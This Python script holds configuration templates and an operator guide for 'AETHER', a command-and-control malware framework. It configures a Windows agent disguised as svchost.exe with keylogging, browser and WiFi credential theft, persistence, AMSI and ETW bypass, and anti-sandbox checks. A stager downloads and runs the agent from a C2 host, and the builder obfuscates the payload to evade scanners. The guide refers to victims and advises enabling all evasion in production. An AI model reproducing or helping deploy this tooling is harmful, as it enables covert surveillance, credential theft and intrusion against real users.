#!/usr/bin/env python3
"""
╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗ - AETHER C2 Framework
║ ║ ║ ║ ║╠═╝║  ║╣ ╠╦╝   Configuration Templates & Reference
╚═╝╩   ╩ ║ ║ ╩═╝╚═╝╩╚═

Complete configuration examples for all AETHER components.
Use these templates to fill in your own values.
"""

import json
from pathlib import Path


class AETHERConfigTemplates:
    """Configuration templates and examples"""
    
    # ===== C2 SERVER CONFIG =====
    C2_MINIMAL = {
        "c2_host": "c2.example.com",
        "c2_port": 443,
        "c2_protocol": "https",
        "encryption_key": "GENERATE_A_RANDOM_64_CHARACTER_STRING",
        
        "c2": {
            "primary_host": "c2.example.com",
            "primary_port": 443,
            "protocol": "https"
        }
    }
    
    C2_FULL = {
        "description": "Full C2 configuration with all options",
        
        "c2_host": "c2.example.com",
        "c2_port": 443,
        "c2_protocol": "https",
        "encryption_key": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        
        "c2": {
            "primary_host": "c2.example.com",
            "primary_port": 443,
            "protocol": "https",
            "path": "/api/v1/beacon"
        },
        
        "beacon": {
            "interval": 30,
            "jitter": 5,
            "adaptive": True,
            "deep_sleep_after_fails": 5,
            "deep_sleep_duration": 3600
        },
        
        "evasion": {
            "tls_fingerprinting": True,
            "domain_fronting": False,
            "dns_obfuscation": False,
            "randomize_user_agent": True,
            "jitter_beacon": True
        },
        
        "persistence_methods": ["registry", "scheduled_task", "service", "wmi"],
        
        "modules": {
            "enable_keylogger": True,
            "enable_screenshot": True,
            "enable_webcam": False,
            "enable_audio": False,
            "enable_browser_stealer": True,
            "enable_wifi_stealer": True,
            "enable_clipboard": True,
            "safe_mode": True
        },
        
        "ai": {
            "enabled": True,
            "learning_rate": 0.01,
            "adapt_beacon_interval": True,
            "evade_based_on_patterns": True
        }
    }
    
    # ===== AGENT CONFIG =====
    AGENT_CONFIG = {
        "description": "AETHER Agent configuration",
        
        "agent": {
            "name": "svchost",
            "display_name": "Windows Host Process",
            "version": "10.0.19041.1",
            
            "persistence_methods": [
                "registry",
                "scheduled_task",
                "service",
                "wmi"
            ],
            
            "registry_persistence": {
                "hive": "HKCU",
                "path": "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "value_name": "WindowsTextInput"
            },
            
            "scheduled_task": {
                "task_name": "WindowsFontCacheUpdate",
                "trigger": "SYSTEM_STARTUP",
                "action": "C:\\Windows\\svchost.exe"
            },
            
            "modules": {
                "keylogger": True,
                "screenshot": True,
                "webcam": False,
                "audio": False,
                "browser_stealer": True,
                "wifi_stealer": True,
                "clipboard": True
            },
            
            "evasion": {
                "amsi_bypass": True,
                "etw_bypass": True,
                "sandbox_detection": True,
                "vm_detection": True,
                "debugger_detection": True,
                "sleep_obfuscation": True,
                "polymorphism": False
            },
            
            "behavior": {
                "max_cpu_usage": 50,
                "max_memory_mb": 100,
                "working_hours": [9, 17],
                "idle_timeout": 300,
                "error_backoff": 60,
                "max_retries": 3
            }
        }
    }
    
    # ===== BUILDER CONFIG =====
    BUILDER_CONFIG = {
        "description": "AETHER Builder configuration",
        
        "builder": {
            "agent_entry": "agent/aether_agent.py",
            "stager_entry": "stager/stager.py",
            
            "output": {
                "name": "svchost.exe",
                "icon": "builder/windows.ico",
                "version_info": "10.0.19041.1"
            },
            
            "obfuscation": {
                "use_pyarmor": True,
                "pyarmor_level": "high",
                "pyarmor_options": {
                    "restrict": 0,
                    "platform": "windows.x86_64",
                    "advanced": 2
                }
            },
            
            "compression": {
                "use_upx": True,
                "upx_path": "builder/upx/upx.exe",
                "upx_args": ["-9", "--ultra-brute"]
            },
            
            "pyinstaller": {
                "one_file": True,
                "console": False,
                "hidden_imports": [
                    "win32api", "win32con", "win32security",
                    "win32process", "win32service", "pythoncom",
                    "wmi", "PIL", "pyautogui", "pyaudio",
                    "cryptography", "Crypto", "requests"
                ],
                "excluded_imports": [
                    "matplotlib", "tkinter", "unittest"
                ]
            }
        }
    }
    
    # ===== STAGER CONFIG =====
    STAGER_CONFIG = {
        "description": "AETHER Stager configuration",
        
        "stager": {
            "config_url": "https://c2.example.com/config.json",
            "agent_url": "https://c2.example.com/agent.exe",
            
            "download": {
                "verify_hash": True,
                "hash_algorithm": "sha256",
                "timeout": 30,
                "retries": 3
            },
            
            "execution": {
                "method": "direct",
                "working_directory": "%TEMP%",
                "hide_window": True
            },
            
            "anti_analysis": {
                "detect_sandbox": True,
                "detect_vm": True,
                "check_debugger": True,
                "fail_safe": "terminate"
            }
        }
    }
    
    # ===== WHATSAPP BOT CONFIG =====
    WHATSAPP_CONFIG = {
        "description": "WhatsApp Bot integration configuration",
        
        "whatsapp": {
            "enabled": True,
            
            "bot": {
                "url": "http://localhost:3000",
                "api_key": "optional-api-key",
                "protocol": "http"
            },
            
            "security": {
                "auth_password": "CHANGE_ME_TO_STRONG_PASSWORD",
                "authorized_users": [
                    # "+1234567890",
                    # "+0987654321"
                ],
                "whitelisting": True,
                "rate_limit": {
                    "commands_per_minute": 10,
                    "messages_per_minute": 20
                }
            },
            
            "features": {
                "command_history": True,
                "session_linking": True,
                "file_transfer": False,
                "batch_commands": False,
                "real_time_updates": False
            },
            
            "limits": {
                "max_message_length": 4096,
                "command_timeout": 30,
                "history_retention_days": 30
            }
        }
    }
    
    # ===== COMPLETE EXAMPLE =====
    COMPLETE_CONFIG = {
        "description": "Complete AETHER configuration example",
        
        # ===== C2 SERVER =====
        "c2_host": "c2.example.com",
        "c2_port": 443,
        "c2_protocol": "https",
        "encryption_key": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
        
        "c2": {
            "primary_host": "c2.example.com",
            "primary_port": 443,
            "protocol": "https",
            "path": "/api/v1/beacon"
        },
        
        "beacon": {
            "interval": 30,
            "jitter": 5,
            "adaptive": True,
            "deep_sleep_after_fails": 5,
            "deep_sleep_duration": 3600
        },
        
        "universal_c2": {
            "enabled": False,
            "channels": [
                {
                    "type": "https_direct",
                    "host": "c2.example.com",
                    "port": 443,
                    "path": "/api/v1/beacon",
                    "priority": 1
                }
            ],
            "max_fails": 5,
            "rotate_on_fail": True
        },
        
        # ===== AGENT =====
        "agent": {
            "name": "svchost",
            "persistence_methods": ["registry", "scheduled_task", "service"],
            "modules": {
                "keylogger": True,
                "screenshot": True,
                "webcam": False,
                "audio": False,
                "browser": True,
                "wifi": True,
                "clipboard": True
            },
            "evasion": {
                "amsi_bypass": True,
                "etw_bypass": True,
                "sandbox_detection": True,
                "vm_detection": True,
                "debugger_detection": True,
                "sleep_obfuscation": True
            }
        },
        
        # ===== BUILDER =====
        "builder": {
            "output_name": "svchost.exe",
            "icon_path": "builder/default.ico",
            "use_pyarmor": True,
            "use_upx": True,
            "obfuscation_level": "high"
        },
        
        # ===== STAGER =====
        "stager": {
            "config_url": "https://c2.example.com/config.json",
            "agent_url": "https://c2.example.com/agent.exe"
        },
        
        # ===== WHATSAPP =====
        "whatsapp": {
            "bot_url": "http://localhost:3000",
            "auth_password": "CHANGE_ME_TO_STRONG_PASSWORD",
            "authorized_users": [
                # "+1234567890"
            ]
        }
    }


def print_template(title, template):
    """Pretty print a configuration template"""
    print(f"\n{'='*80}")
    print(f"{title:^80}")
    print(f"{'='*80}\n")
    print(json.dumps(template, indent=2))
    print()


def save_template(filename, template):
    """Save template to file"""
    try:
        output = Path(filename)
        with open(output, 'w') as f:
            json.dump(template, f, indent=2)
        print(f"✓ Saved to {filename}")
    except Exception as e:
        print(f"✗ Error saving {filename}: {e}")


def main():
    """Main menu for template operations"""
    print("\n" + "="*80)
    print("AETHER Configuration Templates & Reference".center(80))
    print("="*80)
    
    print("\nAvailable Templates:")
    print("[1] C2 Server (Minimal)")
    print("[2] C2 Server (Full)")
    print("[3] Agent Configuration")
    print("[4] Builder Configuration")
    print("[5] Stager Configuration")
    print("[6] WhatsApp Bot Configuration")
    print("[7] Complete Configuration (All Components)")
    print("[8] Save All Templates to Files")
    print("[9] Exit")
    
    choice = input("\nSelect option: ").strip()
    
    if choice == '1':
        print_template("C2 SERVER CONFIGURATION (MINIMAL)", AETHERConfigTemplates.C2_MINIMAL)
    
    elif choice == '2':
        print_template("C2 SERVER CONFIGURATION (FULL)", AETHERConfigTemplates.C2_FULL)
    
    elif choice == '3':
        print_template("AGENT CONFIGURATION", AETHERConfigTemplates.AGENT_CONFIG)
    
    elif choice == '4':
        print_template("BUILDER CONFIGURATION", AETHERConfigTemplates.BUILDER_CONFIG)
    
    elif choice == '5':
        print_template("STAGER CONFIGURATION", AETHERConfigTemplates.STAGER_CONFIG)
    
    elif choice == '6':
        print_template("WHATSAPP BOT CONFIGURATION", AETHERConfigTemplates.WHATSAPP_CONFIG)
    
    elif choice == '7':
        print_template("COMPLETE AETHER CONFIGURATION", AETHERConfigTemplates.COMPLETE_CONFIG)
    
    elif choice == '8':
        print("\nSaving all templates...")
        save_template("config_c2_minimal.json", AETHERConfigTemplates.C2_MINIMAL)
        save_template("config_c2_full.json", AETHERConfigTemplates.C2_FULL)
        save_template("config_agent.json", AETHERConfigTemplates.AGENT_CONFIG)
        save_template("config_builder.json", AETHERConfigTemplates.BUILDER_CONFIG)
        save_template("config_stager.json", AETHERConfigTemplates.STAGER_CONFIG)
        save_template("config_whatsapp.json", AETHERConfigTemplates.WHATSAPP_CONFIG)
        save_template("config_complete.json", AETHERConfigTemplates.COMPLETE_CONFIG)
    
    elif choice == '9':
        return
    
    if choice != '9':
        main()  # Recursive menu


# ===== CONFIGURATION GUIDE =====

CONFIGURATION_GUIDE = """
╔════════════════════════════════════════════════════════════════════════════╗
║                         CONFIGURATION REFERENCE GUIDE                      ║
╚════════════════════════════════════════════════════════════════════════════╝

┌─ CONFIGURATION FILE: config.json ─────────────────────────────────────────┐
│                                                                             │
│ Location: /workspaces/test/config.json                                   │
│ Purpose: Master configuration for all AETHER components                  │
│ Format: JSON                                                              │
│ Usage: Loaded by all scripts at startup                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ REQUIRED FIELDS ───────────────────────────────────────────────────────┐
│                                                                             │
│ 1. c2_host (string)                                                      │
│    Description: Your C2 server's hostname or IP                         │
│    Example: "c2.example.com" or "192.168.1.100"                        │
│    Required: YES                                                         │
│    Notes: Must be accessible from target networks                       │
│                                                                             │
│ 2. c2_port (integer)                                                    │
│    Description: Port where C2 server listens                            │
│    Example: 443, 8443, 8080                                            │
│    Range: 1-65535                                                       │
│    Default: 443 (HTTPS)                                                 │
│    Required: YES                                                         │
│                                                                             │
│ 3. encryption_key (string)                                              │
│    Description: 64-character key for agent encryption                   │
│    Length: Exactly 64 characters                                        │
│    Characters: Alphanumeric + symbols                                   │
│    Required: YES                                                         │
│    ⚠️  DO NOT USE DEFAULT! Generate random key:                        │
│    python3 -c "import secrets, string; print(''.join(secrets.choice(string.ascii_letters+string.digits) for _ in range(64)))"
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ C2 SERVER CONFIGURATION ───────────────────────────────────────────────┐
│                                                                             │
│ Section: "c2"                                                            │
│                                                                             │
│ Fields:                                                                   │
│   • primary_host: Main C2 server address                                │
│   • primary_port: Main C2 server port                                   │
│   • protocol: "https" or "http" (https recommended)                    │
│   • path: API endpoint path (e.g., "/api/v1/beacon")                  │
│                                                                             │
│ Example:                                                                  │
│   "c2": {                                                               │
│     "primary_host": "c2.example.com",                                 │
│     "primary_port": 443,                                              │
│     "protocol": "https",                                              │
│     "path": "/api/v1/beacon"                                          │
│   }                                                                     │
│                                                                             │
│ Beacon Configuration:                                                    │
│   "beacon": {                                                           │
│     "interval": 30,              # Check-in every 30 seconds          │
│     "jitter": 5,                 # Add 0-5 seconds randomness         │
│     "adaptive": true,            # Adjust timing based on activity    │
│     "deep_sleep_after_fails": 5, # Sleep after N failures            │
│     "deep_sleep_duration": 3600  # Sleep for 1 hour                  │
│   }                                                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ AGENT CONFIGURATION ───────────────────────────────────────────────────┐
│                                                                             │
│ Section: "agent"                                                         │
│                                                                             │
│ Key Settings:                                                            │
│                                                                             │
│ 1. name (string)                                                        │
│    Display name for the agent on system                                │
│    Example: "svchost", "explorer", "winlogon"                        │
│    Purpose: Evasion (mimic legitimate process)                         │
│                                                                             │
│ 2. persistence_methods (array)                                          │
│    Techniques to survive system reboot                                 │
│    Options:                                                             │
│      • "registry" - HKLM/HKCU Run keys                                │
│      • "scheduled_task" - Windows Task Scheduler                      │
│      • "service" - Windows Service installation                       │
│      • "wmi" - WMI Event Subscriptions                                │
│      • "run_key" - Registry Run key                                   │
│      • "startup_folder" - User startup folder                        │
│                                                                             │
│    Example:                                                             │
│    "persistence_methods": ["registry", "scheduled_task", "service"]  │
│                                                                             │
│ 3. modules (object)                                                    │
│    Enable/disable intelligence gathering modules                       │
│    Available:                                                           │
│      • keylogger: Log all keyboard input                              │
│      • screenshot: Capture screen images                              │
│      • webcam: Access webcam (risky!)                                 │
│      • audio: Record audio (risky!)                                   │
│      • browser: Extract cookies/passwords                             │
│      • wifi: Steal WiFi credentials                                   │
│      • clipboard: Monitor clipboard                                   │
│                                                                             │
│ 4. evasion (object)                                                    │
│    Anti-detection and anti-analysis techniques                        │
│    Options:                                                             │
│      • amsi_bypass: Bypass Windows antimalware scanner                │
│      • etw_bypass: Disable Event Tracing for Windows                 │
│      • sandbox_detection: Detect analysis sandboxes                   │
│      • vm_detection: Detect virtual machines                          │
│      • debugger_detection: Detect debuggers                           │
│      • sleep_obfuscation: Hide sleep calls from analysis             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ BUILDER CONFIGURATION ────────────────────────────────────────────────┐
│                                                                             │
│ Section: "builder"                                                       │
│                                                                             │
│ 1. output_name (string)                                                │
│    Filename for compiled executable                                   │
│    Example: "svchost.exe", "explorer.exe", "winlogon.exe"           │
│    Purpose: Evasion (mimic legitimate Windows executables)            │
│                                                                             │
│ 2. icon_path (string)                                                 │
│    Path to custom icon file                                           │
│    Example: "builder/windows.ico"                                    │
│    Format: .ico files only                                            │
│                                                                             │
│ 3. use_pyarmor (boolean)                                              │
│    Enable code obfuscation with PyArmor                               │
│    Protects against decompilation                                     │
│    Default: true                                                      │
│                                                                             │
│ 4. use_upx (boolean)                                                  │
│    Enable binary compression                                          │
│    Reduces file size, evades scanners                                 │
│    Default: true                                                      │
│                                                                             │
│ 5. obfuscation_level (string)                                         │
│    Obfuscation strength: "low", "medium", "high"                     │
│    Higher = more secure but slower startup                           │
│    Default: "high"                                                    │
│                                                                             │
│ Example:                                                                │
│   "builder": {                                                        │
│     "output_name": "svchost.exe",                                    │
│     "icon_path": "builder/windows.ico",                              │
│     "use_pyarmor": true,                                             │
│     "use_upx": true,                                                 │
│     "obfuscation_level": "high"                                      │
│   }                                                                   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────┘

┌─ STAGER CONFIGURATION ────────────────────────────────────────────────┐
│                                                                         │
│ Section: "stager"                                                     │
│                                                                         │
│ Purpose: Small initial executable that downloads main agent           │
│                                                                         │
│ 1. config_url (string)                                               │
│    URL where stager downloads agent configuration                    │
│    Should return JSON with agent settings                            │
│    Example: "https://c2.example.com/config.json"                   │
│    Required: YES                                                     │
│    Note: Must be accessible from target network                     │
│                                                                         │
│ 2. agent_url (string)                                               │
│    URL where stager downloads main agent executable                 │
│    Example: "https://c2.example.com/agent.exe"                     │
│    Required: YES                                                     │
│    Note: Must be accessible from target network                     │
│                                                                         │
│ Benefits:                                                             │
│   • Stager is small (<500KB typically)                              │
│   • Easy to distribute and execute                                  │
│   • Main agent can be updated without rebuilding stager             │
│   • Can serve different configs per victim                          │
│                                                                         │
│ Example:                                                              │
│   "stager": {                                                        │
│     "config_url": "https://c2.example.com/config.json",            │
│     "agent_url": "https://c2.example.com/agent.exe"                │
│   }                                                                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────┘

┌─ WHATSAPP BOT CONFIGURATION ──────────────────────────────────────────┐
│                                                                         │
│ Section: "whatsapp"                                                   │
│                                                                         │
│ 1. bot_url (string)                                                  │
│    URL to Baileys WhatsApp bot (Node.js)                            │
│    Example: "http://localhost:3000"                                 │
│    Note: Should match bot server address                            │
│                                                                         │
│ 2. auth_password (string)                                           │
│    Password for WhatsApp authentication                             │
│    Minimum: 8 characters                                            │
│    ⚠️  CHANGE from default!                                         │
│    Default: "aether2025"                                            │
│                                                                         │
│ 3. authorized_users (array)                                         │
│    WhatsApp phone numbers allowed to control C2                     │
│    Format: "+{country_code}{number}"                               │
│    Example: "+1234567890", "+44987654321"                          │
│    Empty array = no one can connect                                │
│                                                                         │
│ 4. enable_command_history (boolean)                                │
│    Log all commands executed via WhatsApp                          │
│    Default: true                                                    │
│                                                                         │
│ 5. enable_session_linking (boolean)                                │
│    Allow linking to specific agent sessions                        │
│    Default: true                                                    │
│                                                                         │
│ Example:                                                              │
│   "whatsapp": {                                                      │
│     "bot_url": "http://localhost:3000",                            │
│     "auth_password": "MySecurePassword123!",                       │
│     "authorized_users": [                                          │
│       "+1234567890",                                               │
│       "+4499887766"                                                │
│     ],                                                              │
│     "enable_command_history": true,                                │
│     "enable_session_linking": true                                 │
│   }                                                                 │
│                                                                         │
│ Setup Steps:                                                          │
│   1. Configure this section                                        │
│   2. Start Baileys bot: cd WA-BOT-Base && npm start               │
│   3. Scan QR code with WhatsApp                                   │
│   4. Start AETHER server: python3 server/aether_server.py        │
│   5. Enable: AETHER> whatsapp enable                              │
│   6. Add users: AETHER> whatsapp authorize +1234567890           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

┌─ MULTI-CHANNEL C2 (OPTIONAL) ────────────────────────────────────────┐
│                                                                     │
│ Section: "universal_c2"                                           │
│                                                                     │
│ Purpose: Multiple C2 channels for redundancy/evasion              │
│ Benefit: If primary fails, agent tries secondary channels        │
│                                                                     │
│ Configuration:                                                     │
│   "universal_c2": {                                               │
│     "enabled": true,                                             │
│     "channels": [                                                │
│       {                                                          │
│         "type": "https_direct",                                 │
│         "host": "c2.example.com",                              │
│         "port": 443,                                            │
│         "path": "/api/v1/beacon",                              │
│         "priority": 1                                           │
│       },                                                         │
│       {                                                          │
│         "type": "https_fronting",                              │
│         "host": "cdn.example.com",  # Frontend                │
│         "actual_host": "c2.example.com",  # Real target       │
│         "port": 443,                                            │
│         "path": "/update",                                      │
│         "priority": 2                                           │
│       },                                                         │
│       {                                                          │
│         "type": "dns_tunnel",                                  │
│         "domain": "c2.example.com",                            │
│         "nameserver": "8.8.8.8",                               │
│         "query_type": "TXT",                                   │
│         "priority": 3                                          │
│       }                                                         │
│     ],                                                          │
│     "max_fails": 5,        # Try N times before switching     │
│     "rotate_on_fail": true # Switch channels on failure      │
│   }                                                             │
│                                                                 │
│ Channel Types:                                                  │
│   • https_direct: Direct HTTPS connection                      │
│   • https_fronting: Domain fronting via CDN                    │
│   • dns_tunnel: Encode data in DNS queries                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─ SECURITY CONSIDERATIONS ────────────────────────────────────────┐
│                                                                 │
│ ⚠️  CRITICAL:                                                   │
│   □ Change encryption_key from default                        │
│   □ Use strong, unique passwords                              │
│   □ Restrict authorized_users to trusted numbers              │
│   □ Use HTTPS (protocol: "https")                            │
│   □ Monitor logs for suspicious activity                      │
│   □ Disable risky modules (webcam, audio) unless needed      │
│   □ Use proper OPSEC (VPN, proxies)                          │
│                                                                 │
│ ⚠️  FOR PRODUCTION:                                             │
│   □ Change all default values                                 │
│   □ Use domain fronting or multi-channel C2                   │
│   □ Enable all evasion techniques                             │
│   □ Use obfuscation level: "high"                            │
│   □ Enable persistence methods                                │
│   □ Test from target network before deployment                │
│   □ Monitor beacon interval to balance stealth/responsiveness│
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
"""


if __name__ == '__main__':
    print(CONFIGURATION_GUIDE)
    print("\nRunning interactive template viewer...\n")
    main()
